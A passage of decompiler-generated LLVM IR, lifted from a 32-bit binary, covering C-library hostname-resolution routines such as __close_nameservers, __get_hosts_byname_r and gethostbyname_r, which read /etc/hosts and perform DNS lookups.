  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1e06c = call i32 @malloc(i32 4)
  store i32 %v1_1e06c, i32* %r0.global-to-local, align 4
  store i32 27396, i32* %r3.global-to-local, align 4
  %v2_1e074 = icmp eq i32 %v1_1e06c, 0
  %v1_1e078 = load i32, i32* @r5, align 4
  %v3_1e078 = add i32 %v1_1e078, 27396
  %v4_1e078 = inttoptr i32 %v3_1e078 to i32*
  store i32 %v1_1e06c, i32* %v4_1e078, align 4
  br i1 %v2_1e074, label %dec_label_pc_1e080, label %dec_label_pc_1e08c

dec_label_pc_1e080:                               ; preds = %dec_label_pc_1e068
  %v0_1e080 = load i32, i32* @r4, align 4
  store i32 %v0_1e080, i32* @r0, align 4
  %v0_1e084 = call i32 @free()
  store i32 %v0_1e084, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e09c

dec_label_pc_1e08c:                               ; preds = %dec_label_pc_1e068
  %v0_1e08c = load i32, i32* @r5, align 4
  %v1_1e08c = load i32, i32* @r7, align 4
  %v2_1e08c = add i32 %v1_1e08c, %v0_1e08c
  %v3_1e08c = inttoptr i32 %v2_1e08c to i32*
  %v4_1e08c = load i32, i32* %v3_1e08c, align 4
  %v1_1e090 = add i32 %v4_1e08c, 1
  store i32 %v1_1e090, i32* %r3.global-to-local, align 4
  %v0_1e094 = load i32, i32* @r4, align 4
  %v2_1e094 = inttoptr i32 %v1_1e06c to i32*
  store i32 %v0_1e094, i32* %v2_1e094, align 4
  %v0_1e098 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e098 = load i32, i32* @r5, align 4
  %v2_1e098 = load i32, i32* @r7, align 4
  %v3_1e098 = add i32 %v2_1e098, %v1_1e098
  %v4_1e098 = inttoptr i32 %v3_1e098 to i32*
  store i32 %v0_1e098, i32* %v4_1e098, align 4
  br label %dec_label_pc_1e09c

dec_label_pc_1e09c:                               ; preds = %dec_label_pc_1e01c, %dec_label_pc_1e00c, %dec_label_pc_1dcf8, %dec_label_pc_1e05c, %dec_label_pc_1e04c, %dec_label_pc_1e038, %dec_label_pc_1e080, %dec_label_pc_1e08c
  store i32 27392, i32* %r3.global-to-local, align 4
  %v0_1e0a0 = load i32, i32* @r5, align 4
  %v2_1e0a0 = add i32 %v0_1e0a0, 27392
  %v3_1e0a0 = inttoptr i32 %v2_1e0a0 to i32*
  %v4_1e0a0 = load i32, i32* %v3_1e0a0, align 4
  store i32 %v4_1e0a0, i32* %r0.global-to-local, align 4
  %v2_1e0a4 = icmp eq i32 %v4_1e0a0, 0
  br i1 %v2_1e0a4, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_1e09c
  store i32 123056, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_1e09c, %bb64
  %v2_1e0ac = xor i1 %v2_1e0a4, true
  call void @__pseudo_cond_branch(i1 %v2_1e0ac, i32 %v4_1e0a0)
  %v2_1e0b4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1e0b4, i32* %r4.global-to-local, align 4
  store i32 %v15_1dca8, i32* @r8, align 4
  store i32 %v18_1dca8, i32* @sb, align 4
  store i32 %v21_1dca8, i32* @sl, align 4
  store i32 %v24_1dca8, i32* @fp, align 4
  store i32 %v27_1dca8, i32* %lr.global-to-local, align 4
  ret i32 %v4_1e0a0

; uselistorder directives
  uselistorder i32 %v4_1e0a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1e01c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1ddac, { 1, 0 }
  uselistorder i32 %v2_1dd94, { 1, 0 }
  uselistorder i32 %v2_1dd74, { 1, 0 }
  uselistorder i32 %v2_1df9c, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_1df6c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1df5c, { 1, 0 }
  uselistorder i32 %v0_1defc, { 1, 0, 2 }
  uselistorder i32 %v1_1de7417, { 1, 0 }
  uselistorder i32 %v1_1de6c10, { 1, 0 }
  uselistorder i32 %v0_1de6c9, { 1, 0 }
  uselistorder i32 %v1_1de74, { 1, 0 }
  uselistorder i32 %v3_1ddf0, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 1, 14, 15, 16, 0, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 1, 6, 0, 8, 7, 15, 9, 10, 11, 12, 13, 14, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 17, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 7, 6, 8, 10, 9, 12, 11, 14, 13, 1, 0, 15, 17, 16, 19, 18, 20, 22, 21, 24, 23, 25, 26, 28, 27, 29, 31, 30, 36, 35, 51, 50, 32, 33, 34, 38, 37, 40, 39, 41, 43, 42, 44, 46, 45, 47, 49, 48, 54, 52, 53, 56, 55 }
  uselistorder i32 (i16*)* @__GI_fclose, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 0, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 6, 4, 7, 1, 2, 3, 5 }
  uselistorder i32 (i32*, i32)* @realloc, { 1, 2, 0 }
  uselistorder i16 2, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 32, 34, 35, 4, 36, 31, 5, 6, 30, 37, 44, 28, 29, 48, 47, 33, 0, 40, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 38, 39, 20, 21, 1, 2, 3, 22, 23, 24, 25, 26, 27, 41, 42, 43, 45, 46 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i8 3, { 0, 2, 1, 3 }
  uselistorder i32 -34332, { 1, 0 }
  uselistorder i32 1179, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 -33356, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33356), { 1, 0 }
  uselistorder i32 27392, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_1e09c, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1e00c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1dfc0, { 1, 0 }
  uselistorder label %dec_label_pc_1dfb8, { 1, 0 }
  uselistorder label %dec_label_pc_1de7c, { 1, 0 }
  uselistorder label %dec_label_pc_1df9c.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_1dcf8, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1e104 = load i32, i32* @r4, align 4
  store i32 %v3_1e104, i32* %stack_var_-20, align 4
  store i32 27400, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  store i32 -33280, i32* %r3.global-to-local, align 4
  %v4_1e118 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 27400) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33280), i32* %r3.global-to-local, align 4
  store i32 123180, i32* @lr, align 4
  %v1_1e128 = icmp ne i32 %v4_1e118, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33280)
  call void @__pseudo_cond_branch(i1 %v1_1e128, i32 ptrtoint (i32* @global_var_17278.1556 to i32))
  store i32 27404, i32* %r3.global-to-local, align 4
  store i32 27408, i32* @r7, align 4
  store i32 27396, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1e13c = load i32, i32* @r5, align 4
  %v3_1e13c = add i32 %v1_1e13c, 27404
  %v4_1e13c = inttoptr i32 %v3_1e13c to i32*
  store i32 0, i32* %v4_1e13c, align 4
  %v0_1e140 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e140 = load i32, i32* @r5, align 4
  %v2_1e140 = load i32, i32* %r4.global-to-local, align 4
  %v3_1e140 = add i32 %v2_1e140, %v1_1e140
  %v4_1e140 = inttoptr i32 %v3_1e140 to i32*
  store i32 %v0_1e140, i32* %v4_1e140, align 4
  br label %dec_label_pc_1e158

dec_label_pc_1e148:                               ; preds = %dec_label_pc_1e158
  store i32 %v4_1e16c, i32* %r3.global-to-local, align 4
  store i32 %v1_1e160, i32* %v3_1e158, align 4
  %v0_1e150 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e150 = load i32, i32* %r2.global-to-local, align 4
  %v4_1e150 = mul i32 %v1_1e150, 4
  %v5_1e150 = add i32 %v4_1e150, %v0_1e150
  %v6_1e150 = inttoptr i32 %v5_1e150 to i32*
  %v7_1e150 = load i32, i32* %v6_1e150, align 4
  store i32 %v7_1e150, i32* @r0, align 4
  %v0_1e154 = call i32 @free()
  br label %dec_label_pc_1e158

dec_label_pc_1e158:                               ; preds = %entry, %dec_label_pc_1e148
  %v0_1e158 = load i32, i32* @r5, align 4
  %v1_1e158 = load i32, i32* @r7, align 4
  %v2_1e158 = add i32 %v1_1e158, %v0_1e158
  %v3_1e158 = inttoptr i32 %v2_1e158 to i32*
  %v4_1e158 = load i32, i32* %v3_1e158, align 4
  store i32 %v4_1e158, i32* @r4, align 4
  %v2_1e15c = icmp eq i32 %v4_1e158, 0
  %v1_1e160 = add i32 %v4_1e158, -1
  store i32 %v1_1e160, i32* %r2.global-to-local, align 4
  %v0_1e164 = load i32, i32* @r6, align 4
  store i32 %v0_1e164, i32* %r3.global-to-local, align 4
  %v2_1e16c = add i32 %v0_1e164, %v0_1e158
  %v3_1e16c = inttoptr i32 %v2_1e16c to i32*
  %v4_1e16c = load i32, i32* %v3_1e16c, align 4
  br i1 %v2_1e15c, label %dec_label_pc_1e16c, label %dec_label_pc_1e148

dec_label_pc_1e16c:                               ; preds = %dec_label_pc_1e158
  store i32 %v4_1e16c, i32* @r0, align 4
  %v0_1e170 = call i32 @free()
  %v0_1e174 = load i32, i32* @r4, align 4
  %v1_1e174 = load i32, i32* @r5, align 4
  %v2_1e174 = load i32, i32* @r6, align 4
  %v3_1e174 = add i32 %v2_1e174, %v1_1e174
  %v4_1e174 = inttoptr i32 %v3_1e174 to i32*
  store i32 %v0_1e174, i32* %v4_1e174, align 4
  %v2_1e17c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1e17c, i32* %r4.global-to-local, align 4
  ret i32 %v0_1e170

; uselistorder directives
  uselistorder i32 %v4_1e16c, { 1, 0 }
  uselistorder i32 %v1_1e160, { 1, 0 }
  uselistorder i32* %v3_1e158, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 27396, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 27408, { 1, 2, 4, 3, 0 }
  uselistorder i32 27404, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -33280, { 1, 2, 0, 3 }
  uselistorder i32 27400, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_1e158, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_1e19c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1e1d8 = call i32 @__read_etc_hosts_r()
  store i32 %v0_1e19c, i32* @lr, align 4
  ret i32 %v0_1e1d8
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_1e1f0 = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1e1fc = load i32, i32* @r0, align 4
  store i32 %v0_1e1fc, i32* @sl, align 4
  %v2_1e1fc = icmp eq i32 %v0_1e1fc, 0
  %v2_1e200 = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1e200, align 4
  %v0_1e204 = load i32, i32* @r1, align 4
  store i32 %v0_1e204, i32* @r7, align 4
  %v0_1e208 = load i32, i32* @r3, align 4
  store i32 %v0_1e208, i32* @r6, align 4
  br i1 %v2_1e1fc, label %bb, label %dec_label_pc_1e214

bb:                                               ; preds = %entry
  %v1_1e20c = load i32, i32* @r5, align 4
  %v2_1e20c = add i32 %v1_1e20c, 22
  store i32 %v2_1e20c, i32* @r5, align 4
  br label %dec_label_pc_1e4d0

dec_label_pc_1e214:                               ; preds = %entry
  %v0_1e214 = call i32 @__GI___errno_location()
  store i32 %v0_1e214, i32* %r0.global-to-local, align 4
  %v3_1e218 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e218, i32* %ip.global-to-local, align 4
  %v1_1e21c = inttoptr i32 %v0_1e214 to i32*
  %v2_1e21c = load i32, i32* %v1_1e21c, align 4
  store i32 %v2_1e21c, i32* @r8, align 4
  %v0_1e220 = load i32, i32* @r5, align 4
  store i32 %v0_1e220, i32* %v1_1e21c, align 4
  %v0_1e224 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_1e214, i32* @r4, align 4
  %v0_1e234 = load i32, i32* @sl, align 4
  store i32 %v0_1e234, i32* %r0.global-to-local, align 4
  %v0_1e238 = load i32, i32* @r7, align 4
  store i32 %v0_1e238, i32* %r2.global-to-local, align 4
  store i32 %v0_1e1f0, i32* %r3.global-to-local, align 4
  %v0_1e240 = load i32, i32* @r6, align 4
  %v7_1e248 = call i32 @__get_hosts_byname_r(i32 %v0_1e234, i32 2, i32 %v0_1e238, i32 %v0_1e1f0, i32 %v0_1e240, i32 %v0_1e224, i32 %tmp18)
  store i32 %v7_1e248, i32* %r0.global-to-local, align 4
  store i32 %v7_1e248, i32* @r5, align 4
  %v2_1e24c = icmp eq i32 %v7_1e248, 0
  br i1 %v2_1e24c, label %bb34, label %dec_label_pc_1e258

bb34:                                             ; preds = %dec_label_pc_1e214
  %v1_1e250 = load i32, i32* @r8, align 4
  %v2_1e250 = load i32, i32* @r4, align 4
  %v3_1e250 = inttoptr i32 %v2_1e250 to i32*
  store i32 %v1_1e250, i32* %v3_1e250, align 4
  br label %dec_label_pc_1e4d0

dec_label_pc_1e258:                               ; preds = %dec_label_pc_1e214
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_1e25c = inttoptr i32 %tmp18 to i32*
  %v2_1e25c = load i32, i32* %v1_1e25c, align 4
  store i32 %v2_1e25c, i32* %r3.global-to-local, align 4
  %v7_1e260 = icmp eq i32 %v2_1e25c, 1
  br i1 %v7_1e260, label %dec_label_pc_1e27c, label %dec_label_pc_1e268

dec_label_pc_1e268:                               ; preds = %dec_label_pc_1e258
  %v7_1e268 = icmp eq i32 %v2_1e25c, 4
  br i1 %v7_1e268, label %dec_label_pc_1e29c, label %dec_label_pc_1e270

dec_label_pc_1e270:                               ; preds = %dec_label_pc_1e268
  %v3_1e270 = icmp eq i32 %v2_1e25c, -1
  br i1 %v3_1e270, label %dec_label_pc_1e290, label %dec_label_pc_1e4d0

dec_label_pc_1e27c:                               ; preds = %dec_label_pc_1e258
  %v7_1e27c = icmp eq i32 %v7_1e248, 2
  br i1 %v7_1e27c, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_1e27c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1e2a4

.thread4:                                         ; preds = %dec_label_pc_1e27c
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1e2a4

dec_label_pc_1e290:                               ; preds = %dec_label_pc_1e270
  %v0_1e290 = load i32, i32* @r4, align 4
  %v1_1e290 = inttoptr i32 %v0_1e290 to i32*
  %v2_1e290 = load i32, i32* %v1_1e290, align 4
  store i32 %v2_1e290, i32* %r3.global-to-local, align 4
  %v7_1e294 = icmp eq i32 %v2_1e290, 2
  br i1 %v7_1e294, label %dec_label_pc_1e29c, label %dec_label_pc_1e4d0

dec_label_pc_1e29c:                               ; preds = %dec_label_pc_1e290, %dec_label_pc_1e268
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1e2a4

dec_label_pc_1e2a4:                               ; preds = %.thread4, %bb35, %dec_label_pc_1e29c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1e29c ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1e2ac = load i32, i32* @r8, align 4
  %v1_1e2ac = load i32, i32* @r4, align 4
  %v2_1e2ac = inttoptr i32 %v1_1e2ac to i32*
  store i32 %v0_1e2ac, i32* %v2_1e2ac, align 4
  %v0_1e2b0 = load i32, i32* @sl, align 4
  %v1_1e2b0 = inttoptr i32 %v0_1e2b0 to i8*
  store i32 %v0_1e2b0, i32* %r0.global-to-local, align 4
  %v0_1e2b4 = load i32, i32* @r3, align 4
  %v1_1e2b4 = load i32, i32* @ip, align 4
  %v2_1e2b4 = inttoptr i32 %v1_1e2b4 to i32*
  store i32 %v0_1e2b4, i32* %v2_1e2b4, align 4
  %v3_1e2b8 = call i32 @strlen(i8* %v1_1e2b0)
  store i32 %v3_1e2b8, i32* %r0.global-to-local, align 4
  %v1_1e2bc = add i32 %v3_1e2b8, 1
  store i32 %v1_1e2bc, i32* @r4, align 4
  %v0_1e2c0 = load i32, i32* @r6, align 4
  %v7_1e2c4 = icmp sgt i32 %v0_1e2c0, %v1_1e2bc
  br i1 %v7_1e2c4, label %dec_label_pc_1e2c8, label %dec_label_pc_1e4cc

dec_label_pc_1e2c8:                               ; preds = %dec_label_pc_1e2a4
  %v0_1e2c8 = load i32, i32* @sl, align 4
  store i32 %v0_1e2c8, i32* @r1, align 4
  store i32 %v1_1e2bc, i32* @r2, align 4
  store i32 %v0_1e1f0, i32* @r0, align 4
  %v0_1e2d4 = call i32 @memcpy()
  store i32 %v0_1e2d4, i32* %r0.global-to-local, align 4
  %v1_1e2dc = load i32, i32* @r4, align 4
  %v2_1e2dc = add i32 %v1_1e2dc, %v0_1e1f0
  %v1_1e2e0 = sub i32 0, %v2_1e2dc
  %v1_1e2e4 = load i32, i32* @r6, align 4
  %v2_1e2e4 = sub i32 %v1_1e2e4, %v1_1e2dc
  store i32 %v2_1e2e4, i32* %r2.global-to-local, align 4
  %v1_1e2e8 = urem i32 %v1_1e2e0, 4
  store i32 %v1_1e2e8, i32* %r3.global-to-local, align 4
  %v2_1e2ec = sub i32 %v2_1e2e4, %v1_1e2e8
  store i32 %v2_1e2ec, i32* @sb, align 4
  %v1_1e2f0 = add i32 %v2_1e2ec, -8
  store i32 %v1_1e2f0, i32* @r5, align 4
  %v7_1e2f8 = icmp slt i32 %v1_1e2f0, 256
  br i1 %v7_1e2f8, label %dec_label_pc_1e4cc, label %dec_label_pc_1e2fc

dec_label_pc_1e2fc:                               ; preds = %dec_label_pc_1e2c8
  %v2_1e2fc = add i32 %v1_1e2e8, %v2_1e2dc
  store i32 %v2_1e2fc, i32* @fp, align 4
  store i32 %v0_1e1f0, i32* %ip.global-to-local, align 4
  %v1_1e304 = add i32 %v2_1e2fc, 8
  store i32 %v1_1e304, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1e30c = add i32 %v2_1e2fc, 16
  store i32 %v1_1e30c, i32* @r8, align 4
  %v4_1e310 = inttoptr i32 %v2_1e2fc to i32*
  store i32 %v0_1e1f0, i32* %v4_1e310, align 4
  %v0_1e314 = load i32, i32* @sl, align 4
  store i32 %v0_1e314, i32* %r0.global-to-local, align 4
  %v0_1e318 = load i32, i32* @r4, align 4
  %v1_1e318 = load i32, i32* @fp, align 4
  %v2_1e318 = add i32 %v1_1e318, 4
  %v3_1e318 = inttoptr i32 %v2_1e318 to i32*
  store i32 %v0_1e318, i32* %v3_1e318, align 4
  %v0_1e31c = load i32, i32* @r8, align 4
  %v2_1e320 = inttoptr i32 %v0_1e314 to i8*
  %v3_1e320 = call i32 @inet_aton(i8* %v2_1e320, i32 %v0_1e31c)
  store i32 %v3_1e320, i32* %r0.global-to-local, align 4
  %v1_1e324 = load i32, i32* @r4, align 4
  %v9_1e324 = icmp eq i32 %v3_1e320, %v1_1e324
  br i1 %v9_1e324, label %dec_label_pc_1e368, label %dec_label_pc_1e32c

dec_label_pc_1e32c:                               ; preds = %dec_label_pc_1e2fc
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1e330 = load i32, i32* @r7, align 4
  %v2_1e330 = add i32 %v1_1e330, 8
  %v3_1e330 = inttoptr i32 %v2_1e330 to i32*
  store i32 2, i32* %v3_1e330, align 4
  %v0_1e334 = load i32, i32* %r3.global-to-local, align 4
  %v2_1e334 = mul i32 %v0_1e334, 2
  %v1_1e338 = load i32, i32* @r7, align 4
  %v2_1e338 = add i32 %v1_1e338, 12
  %v3_1e338 = inttoptr i32 %v2_1e338 to i32*
  store i32 %v2_1e334, i32* %v3_1e338, align 4
  %v3_1e33c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e33c, i32* %r2.global-to-local, align 4
  store i32 %v0_1e1f0, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1e348 = load i32, i32* @r4, align 4
  store i32 %v0_1e348, i32* @r5, align 4
  %v0_1e34c = load i32, i32* @r8, align 4
  %v1_1e34c = load i32, i32* @fp, align 4
  %v2_1e34c = add i32 %v1_1e34c, 8
  %v3_1e34c = inttoptr i32 %v2_1e34c to i32*
  store i32 %v0_1e34c, i32* %v3_1e34c, align 4
  %v0_1e350 = load i32, i32* @r7, align 4
  %v1_1e350 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e350 = inttoptr i32 %v1_1e350 to i32*
  store i32 %v0_1e350, i32* %v2_1e350, align 4
  %v0_1e354 = load i32, i32* @r7, align 4
  %v1_1e354 = inttoptr i32 %v0_1e354 to i32*
  %v2_1e354 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_1e354, i32* %v1_1e354, align 4
  %v3_1e354 = add i32 %v0_1e354, 4
  %v4_1e354 = inttoptr i32 %v3_1e354 to i32*
  %v5_1e354 = load i32, i32* @fp, align 4
  store i32 %v5_1e354, i32* %v4_1e354, align 4
  %v0_1e358 = load i32, i32* @r6, align 4
  %v1_1e358 = load i32, i32* @r7, align 4
  %v2_1e358 = add i32 %v1_1e358, 16
  %v3_1e358 = inttoptr i32 %v2_1e358 to i32*
  store i32 %v0_1e358, i32* %v3_1e358, align 4
  %v0_1e35c = load i32, i32* @r4, align 4
  %v1_1e35c = load i32, i32* @ip, align 4
  %v2_1e35c = inttoptr i32 %v1_1e35c to i32*
  store i32 %v0_1e35c, i32* %v2_1e35c, align 4
  %v0_1e360 = load i32, i32* @r4, align 4
  %v1_1e360 = load i32, i32* @r6, align 4
  %v2_1e360 = add i32 %v1_1e360, 4
  %v3_1e360 = inttoptr i32 %v2_1e360 to i32*
  store i32 %v0_1e360, i32* %v3_1e360, align 4
  br label %dec_label_pc_1e4d0

dec_label_pc_1e368:                               ; preds = %dec_label_pc_1e2fc
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_1e36c = icmp eq i32 %storemerge2, 0
  br i1 %v2_1e36c, label %dec_label_pc_1e384, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1e368
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1e25c, align 4
  br label %dec_label_pc_1e4d0

dec_label_pc_1e384:                               ; preds = %dec_label_pc_1e368
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1e390 = load i32, i32* @sl, align 4
  store i32 %v0_1e390, i32* %r0.global-to-local, align 4
  %v2_1e398 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1e398, i32* %r2.global-to-local, align 4
  %v2_1e39c = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1e39c, i32* %r3.global-to-local, align 4
  %v7_1e3a8 = inttoptr i32 %v0_1e390 to i8*
  %v8_1e3a8 = call i32 @__dns_lookup(i8* %v7_1e3a8, i32 1, i32 %v2_1e398, i32 %v2_1e39c)
  store i32 %v8_1e3a8, i32* %r0.global-to-local, align 4
  %v1_1e3ac = icmp slt i32 %v8_1e3a8, 0
  br i1 %v1_1e3ac, label %.thread, label %dec_label_pc_1e3c4

.thread:                                          ; preds = %dec_label_pc_1e384
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1e25c, align 4
  br label %dec_label_pc_1e4d0

dec_label_pc_1e3c4:                               ; preds = %dec_label_pc_1e384
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_1e3c8 = icmp eq i32 %tmp12, 1
  br i1 %v7_1e3c8, label %dec_label_pc_1e3d0, label %dec_label_pc_1e4a8

dec_label_pc_1e3d0:                               ; preds = %dec_label_pc_1e3c4
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_1e3e8 = load i32, i32* @r5, align 4
  %v2_1e3e8 = add i32 %v0_1e3e8, -12
  store i32 %v2_1e3e8, i32* @r8, align 4
  %v8_1e3e8 = icmp slt i32 %v2_1e3e8, 0
  br i1 %v8_1e3e8, label %bb37, label %dec_label_pc_1e3f4

bb37:                                             ; preds = %dec_label_pc_1e3d0
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1e4b8

dec_label_pc_1e3f4:                               ; preds = %dec_label_pc_1e3d0
  %v0_1e3f4 = load i32, i32* @r6, align 4
  store i32 %v0_1e3f4, i32* @r1, align 4
  %v2_1e3f8 = add i32 %v0_1e3f4, 12
  store i32 %v2_1e3f8, i32* @r0, align 4
  %v2_1e3fc = call i32 @memmove(i32 %v2_1e3f8, i32 %v0_1e3f4)
  %v0_1e400 = load i32, i32* @fp, align 4
  %v1_1e400 = add i32 %v0_1e400, 4
  store i32 %v1_1e400, i32* @r3, align 4
  %v1_1e404 = load i32, i32* @r4, align 4
  %v2_1e404 = add i32 %v1_1e404, %v1_1e400
  store i32 %v2_1e404, i32* @r5, align 4
  store i32 %v2_1e404, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1e414 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1e420.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e420

dec_label_pc_1e420:                               ; preds = %dec_label_pc_1e420, %dec_label_pc_1e3f4
  %v0_1e420 = phi i32 [ %v0_1e420.pre, %dec_label_pc_1e3f4 ], [ %v1_1e424, %dec_label_pc_1e420 ]
  %v1_1e420 = load i32, i32* @r6, align 4
  %v7_1e420 = inttoptr i32 %v1_1e420 to i32*
  store i32 %v0_1e420, i32* %v7_1e420, align 4
  %v0_1e424 = load i32, i32* @r5, align 4
  %v1_1e424 = add i32 %v0_1e424, 4
  store i32 %v1_1e424, i32* @r5, align 4
  %v0_1e428 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e428 = add i32 %v0_1e428, 1
  store i32 %v1_1e428, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1e428, 0
  br i1 %tmp38, label %dec_label_pc_1e420, label %dec_label_pc_1e438

dec_label_pc_1e438:                               ; preds = %dec_label_pc_1e420
  %v3_1e438 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1e438, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1e440 = icmp eq i32 %v3_1e438, 0
  %v1_1e444 = load i32, i32* @r6, align 4
  %v5_1e444 = mul i32 %v1_1e428, 4
  %v6_1e444 = add i32 %v1_1e444, %v5_1e444
  %v7_1e444 = inttoptr i32 %v6_1e444 to i32*
  store i32 0, i32* %v7_1e444, align 4
